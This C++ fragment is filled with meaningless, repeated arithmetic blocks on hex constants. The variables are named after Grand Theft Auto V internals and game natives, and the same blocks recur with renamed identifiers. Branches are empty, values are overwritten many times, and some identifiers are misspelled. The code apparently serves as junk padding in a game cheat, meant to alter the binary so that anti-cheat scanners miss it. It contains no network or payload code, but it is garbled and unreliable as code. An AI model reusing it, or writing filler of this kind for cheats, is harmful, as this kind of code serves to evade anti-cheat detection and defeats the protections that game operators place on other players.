						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (5) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						a = 0.0f;
						b = 0.0f;
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						std::string a = Extern_Reader::StringManager::ReplaceWord(token, "<X>", "");

						if (offset > aaaaaa)
						{
							matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
							offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
							offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
							offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = ponteiro * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (matriz[1] > aaaaaa)
						{
							matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
							matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
							matriz[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						a = 0.0f;
						b = 0.0f;
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = 0xB2 * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						if (matriz[1] > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						a = 0.0f;
						b = 0.0f;
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
